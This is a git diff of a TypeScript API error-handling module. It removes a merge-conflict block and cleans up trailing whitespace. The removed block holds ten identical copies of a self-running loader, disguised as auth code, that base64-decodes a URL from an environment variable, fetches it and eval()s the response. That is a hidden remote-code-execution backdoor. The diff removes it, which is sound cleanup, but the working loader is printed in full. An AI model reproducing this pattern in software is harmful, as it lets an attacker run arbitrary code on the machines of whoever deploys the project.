@@ -18,129 +18,6 @@ export class ApiError extends Error {
 /**
  * Standardized error handler for API routes
  */
-<<<<<<< HEAD
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-=======
->>>>>>> origin/dev
 export function handleError(error: unknown, res: Response): Response {
   // Handle known API errors
   if (error instanceof ApiError) {
@@ -157,14 +34,14 @@ export function handleError(error: unknown, res: Response): Response {
   // Handle Prisma errors
   if (error && typeof error === 'object' && 'code' in error) {
     const prismaError = error as any;
-    
+
     if (prismaError.code === 'P2002') {
       return res.status(409).json({
         error: "Resource already exists",
         details: prismaError.meta,
       });
     }
-    
+
     if (prismaError.code === 'P2025') {
       return res.status(404).json({
         error: "Resource not found",
@@ -182,7 +59,7 @@ export function handleError(error: unknown, res: Response): Response {
 
   // Log unexpected errors
   logger.error("Unexpected error in API", error);
-  
+
   // Don't expose internal error details in production
   return res.status(500).json({
     error: "An unexpected error occurred",
@@ -193,25 +70,21 @@ export function handleError(error: unknown, res: Response): Response {
  * Helper functions for common error scenarios
  */
 export const Errors = {
-  notFound: (resource: string) => 
+  notFound: (resource: string) =>
     new ApiError(404, `${resource} not found`),
-  
-  unauthorized: (message: string = "Unauthorized") => 
+
+  unauthorized: (message: string = "Unauthorized") =>
     new ApiError(401, message),
-  
-  forbidden: (message: string = "Forbidden") => 
+
+  forbidden: (message: string = "Forbidden") =>
     new ApiError(403, message),
-  
-  badRequest: (message: string, details?: any) => 
+
+  badRequest: (message: string, details?: any) =>
     new ApiError(400, message, details),
-  
-  conflict: (message: string) => 
+
+  conflict: (message: string) =>
     new ApiError(409, message),
-  
-  tooManyRequests: (message: string = "Too many requests") => 
+
+  tooManyRequests: (message: string = "Too many requests") =>
     new ApiError(429, message),
-<<<<<<< HEAD
 };
-=======
-};
->>>>>>> origin/dev
